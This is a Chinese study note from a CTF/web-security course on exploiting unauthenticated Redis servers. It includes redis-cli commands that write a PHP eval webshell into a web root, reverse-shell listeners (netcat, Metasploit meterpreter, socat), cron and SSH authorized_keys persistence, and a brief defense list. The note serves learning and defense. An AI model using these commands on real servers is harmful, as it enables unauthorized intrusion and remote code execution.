---
title: 11-Redis未授权访问漏洞
date: 2025-08-13 13:49:08
tags: [CTF, web, 马士兵]
categories: 笔记
---

### Redis常见用途

Remote Dictionary Service

- 缓存
- 分布式session, 分布式锁，分布式全局ID
- 计数器，限流
- 列表
- 抽奖
- 标签
- 排行榜

### Redis持久化

RDB: Redis DataBase(默认)
AOF: Append Only File

## Webshell提权

```bash
redis-cli -h example.com -p 6379
config set dir /www/admin/localhost_80/wwwroot
config set dbfilename redis.php
set x “<?php @eval($_POST[hajimi]): ?>”
save
```

<!--more-->

## 反弹连接

### 原因

- 内网，私有IP
- IP动态变化
- 6379端口不允许入方向
- 一句话木马被杀软删除

### 监听

```bash
#netcat
nc -lvp 7777

#msf
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.xxx.xxx
set lport 7777
run

#socat(kali)
socat TCP-LISTEN:7777 -
```

### 靶机建立反弹连接

![](/img/msb/17389164721036.jpg)

![](/img/msb/17389177981544.png)

![](/img/msb/17389167707220.png)

注意防火墙

### 总结

流程：
1. 监听端口
2. 执行命令，或上传payload访问，建立连接

上传方式：
- 文件上传漏洞
- 写入文件：MySQL, Redis, CMS
- 文本编辑命令：tee, test.py

执行方式：
访问或定时任务自动触发

### 定时任务

Linux crontab:
![](/img/msb/17389179459084.png)

cron文件存储路径：
/var/spool/cron: 系统管理员制定的维护系统以及其他任务的crontab
/etc/crontab: 对应周期的任务, daily, hourly, monthly, weekly

### SSH免密登录

Redis利用SSH Key提权流程：
1. 控制机连接到Redis
2. 向$HOME/.ssh/authorized_keys写入公钥
3. ssh -i ./id_rsa user@IP 使用私钥免密登录

### 其他利用方式

- 基于主从复制的RCE
- jackson反序列化利用
- lua RCE
- Redis密码爆破

### 防御

- 限制访问IP
- 修改默认端口
- 使用密码访问
- 不要用root权限运行